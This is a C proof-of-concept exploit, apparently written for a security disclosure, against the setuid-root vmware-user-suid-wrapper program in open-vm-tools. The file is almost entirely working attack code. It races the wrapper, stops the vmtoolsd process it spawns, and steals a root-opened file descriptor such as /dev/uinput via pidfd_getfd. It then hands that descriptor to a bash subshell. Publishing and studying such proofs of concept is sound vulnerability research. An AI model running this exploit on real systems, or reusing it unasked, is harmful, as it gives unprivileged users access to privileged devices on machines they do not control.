/*
 * Matthias Gerstner (matthias.gerstner@suse.de)
 *
 * 2023-07-24
 *
 * Proof of concept that shows a vulnerability in the setuid-root program
 * `vmware-user-suid-wrapper` which is part of the open-vm-tools project.
 *
 * The setuid-root program opens the following files using root privileges:
 *
 * - /dev/uinput
 * - /run/vmblock-fuse/dev
 *
 * then drops root privileges and executes the vmtoolsd daemon.
 *
 * On Linux this privilege drop means that other unprivileged processes owned
 * by the real UID of the process can now ptrace() vmtoolsd and perform other
 * privileged operations to obtain the already opened privileged files.
 *
 * This proof of concept invokes `vmware-user-suid-wrapper` and attempts to
 * win a race condition to snatch the desired file descriptor  from a
 * (possibly short living) vmtoolsd grand child process.
 *
 * The file descriptor to snatch is determined by the single command line
 * argument (/dev/uinput by default). This variant of the exploit shows that
 * exploiting the vulnerability is also possible in non-graphical
 * environments, for users without any special capabilities (like `nobody`)
 * and even on non-vmware hosts.
 */

#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define VMTOOLSD "/usr/bin/vmtoolsd"
#define FATAL_EXIT 10

extern char **environ;
struct stat st;
char sbuf[PATH_MAX];
pid_t wrapper_child_pid = -1;

/* system call wrappers since the pidfd family of functions does not yet have
 * wrappers in glibc */

static int pidfd_open(pid_t pid) {
	return syscall(SYS_pidfd_open, pid, 0);
}

static int pidfd_send_signal(int pidfd, int sig) {
	return syscall(SYS_pidfd_send_signal, pidfd, sig, NULL, 0);
}

static int pidfd_getfd(int pidfd, int targetfd) {
	return syscall(SYS_pidfd_getfd, pidfd, targetfd);
}

static void exec_prog(const char *path) {
	const char *argv[] = {path, NULL};
	execve(path, (void*)argv, environ);
	fprintf(stderr, "%s: ", path);
	perror("execve()");
	_exit(FATAL_EXIT);
}

static void prepare_wrapper() {
	wrapper_child_pid = fork();

	if (wrapper_child_pid == 0) {
		// wait until we're asked to actually continue
		raise(SIGSTOP);
		// make sure /dev/uinput is also opened by the setuid-wrapper.
		setenv("XDG_SESSION_TYPE", "wayland", 1);
		exec_prog("/usr/bin/vmware-user-suid-wrapper");
	} else {
		int status = 0;

		do {
			if (waitpid(wrapper_child_pid, &status, WUNTRACED) < 0) {
				perror("waitpid()");
				exit(1);
			}
		} while (!WIFSTOPPED(status));
	}
}

static void kickoff_wrapper() {
	kill(wrapper_child_pid, SIGCONT);
}

static void collect_wrapper() {
	if (wrapper_child_pid < 0)
		return;

	int status = 0;

	do {
		if (waitpid(wrapper_child_pid, &status, 0) < 0) {
			perror("waitpid(wrapper)");
		}
	} while (!WIFEXITED(status));

	wrapper_child_pid = -1;

	if (WEXITSTATUS(status) == FATAL_EXIT) {
		fprintf(stderr, "wrapper child process encountered fatal error\n");
		exit(1);
	}
}


// convert a string representing an integer to and int, returns operation success flag
static bool stoint(const char *s, int *out) {
	int items = sscanf(s, "%d", out);

	return items > 0;
}

static bool is_dir(int dir_fd, struct dirent *ent) {
	if (ent->d_type == DT_DIR) {
		return true;
	} else if (ent->d_type != DT_UNKNOWN) {
		return false;
	}

	if (fstatat(dir_fd, ent->d_name, &st, 0) != 0) {
		switch (errno) {
			case ENOENT: // race
			case EPERM: // not owned by us
			case EACCES:
				return false;
			default:
				perror("fstat(): /proc/<pid>");
				exit(1);
		}
	}

	return (st.st_mode & S_IFMT) == S_IFDIR;
}

static void build_proc_exe_path(const char *pid) {
	int req = snprintf(sbuf, sizeof(sbuf), "/proc/%s/exe", pid);

	if (req < 0 || (size_t)req >= sizeof(sbuf)) {
		fprintf(stderr, "snprintf overflow\n");
		exit(1);
	}
}

/*
 * finds out the PID for the daemon running the executable defined in
 * `VMTOOLSD`. On error -1 is returned.
 *
 * To reduce the amount of system calls required to walk through /proc this
 * function employ a heuristic assuming that the grand-child process will
 * receive a PID close to `wrapper_child_pid`.
 */
static pid_t find_daemon() {
	pid_t ret = -1;
	DIR *proc = opendir("/proc");
	struct dirent *ent = NULL;
	char target[PATH_MAX];

	if (!proc) {
		perror("opendir(): /proc");
		return ret;
	}

	pid_t cur_pid = -1;
	int proc_fd = dirfd(proc);

	kickoff_wrapper();

	while ((ent = readdir(proc)) != NULL) {
		if (!stoint(ent->d_name, &cur_pid))
			continue;
		else if (!is_dir(proc_fd, ent))
			continue;
		// this is a bit of heuristics but it should reduce the amount
		// of system calls we require to catch a short-living vmtoolsd
		// significantly
		else if (cur_pid < wrapper_child_pid || cur_pid > (wrapper_child_pid + 50))
			continue;

		build_proc_exe_path(ent->d_name);

		int written = readlink(sbuf, target, sizeof(target));

		if (written < 0) {
			switch (errno) {
				case EPERM: // not owned by us
				case EACCES:
					continue;
				default:
					break;
			}
			printf("readlink(): /proc/%s/exe failed\n", ent->d_name);
		} else if ((size_t)written >= sizeof(target)) {
			fprintf(stderr, "readlink(): buffer truncation occured");
			exit(1);
		}

		target[written] = '\0';

		if (strcmp(target, VMTOOLSD) == 0) {
			ret = cur_pid;
			break;
		}
	}

	closedir(proc);

	return ret;
}

/*
 * Returns the number of the file descriptor matching the given
 * `searched_path` in the daemon process running under PID `daemon_pid`
 * 
 * On error -1 is returned.
 */
static int find_target_fd(int daemon_pid, const char *searched_path) {

	int req = snprintf(sbuf, sizeof(sbuf), "/proc/%d/fd", daemon_pid);

	if (req < 0 || (size_t)req >= sizeof(sbuf)) {
		fprintf(stderr, "snprintf overflow\n");
		exit(1);
	}

	struct dirent *ent = NULL;
	DIR *fd_dir = opendir(sbuf);

	if (!fd_dir) {
		perror("opendir(): /proc/<vmtoolsd-pid>/fd");
		return -1;
	}

	int fd_num = -1;
	int fd_dir_fd = dirfd(fd_dir);

	while ((ent = readdir(fd_dir)) != NULL) {
		if (!stoint(ent->d_name, &fd_num))
			continue;

		ssize_t len = readlinkat(fd_dir_fd, ent->d_name, sbuf, sizeof(sbuf));

		if (len < 0)
			continue;

		sbuf[len] = '\0';

		if (strcmp(sbuf, searched_path) == 0) {
			break;
		}
	}

	closedir(fd_dir);

	return fd_num;
}

/**
 * Performs the operational sequence of:
 *
 * - stopping the daemon to prevent further races
 * - finding the target file descriptor for the file specified on the command
 *   line
 * - duplicating this file descriptor from the VMTOOLS daemon
 * - resuming the daemon's operation
 *
 * returns the snatched fd or -1 if none could be obtained.
 **/
static int try_snatch_fd(pid_t daemon_pid, const char *snatch_fd_path) {

	if (daemon_pid < 0) {
		printf("failed to find %s process\n", VMTOOLSD);
		return -1;
	} else {
		printf("%s running at %d\n", VMTOOLSD, daemon_pid);
	}

	int daemon_file = pidfd_open(daemon_pid);

	if (daemon_file < 0) {
		perror("pidfd_open(<vmtoolsd>)");
		return -1;
	}

	// stop the daemon so we can continue working with in peace without
	// fear of it meanwhile exiting
	pidfd_send_signal(daemon_pid, SIGSTOP);

	int daemon_fd_num = find_target_fd(daemon_pid, snatch_fd_path);

	int snatched_fd = -1;

	if (daemon_fd_num < 0) {
		fprintf(stderr, "failed to find fd to snatch (%s)", snatch_fd_path);
	} else {
		printf("Found fd %d for %s in %s\n", daemon_fd_num, snatch_fd_path, VMTOOLSD);
		snatched_fd = pidfd_getfd(daemon_file, daemon_fd_num);

		if (snatched_fd < 0) {
			perror("failed to snatch fd: pidfd_get_fd()");
		}
	}

	// let the daemon continue running
	pidfd_send_signal(daemon_pid, SIGCONT);

	close(daemon_file);

	return snatched_fd;
}

static void run_subshell(int snatched_fd) {
	// reset the O_CLOEXEC flag, which is always set by pidfd_getfd.
	fcntl(snatched_fd, F_SETFD, 0);
	// execute new sub shell owning the snatched file descriptor
	printf("Executing sub shell which will inherit the snatched file descriptor %d (check /proc/self/fd)\n", snatched_fd);
	exec_prog("/bin/bash");
}

int main(int argc, const char **argv) {
	const char *snatch_fd_path = argc == 2 ? argv[1] : "/dev/uinput";

	while (true) {

		collect_wrapper(); // collect possibly still existing child
		prepare_wrapper(); // start a new one

		pid_t daemon_pid = find_daemon();
		if (daemon_pid < 0)
			continue;

		int snatch_res = try_snatch_fd(daemon_pid, snatch_fd_path);

		if (snatch_res < 0) {
			continue;
		}

		collect_wrapper();
		run_subshell(snatch_res);
		return 1;
	}
}
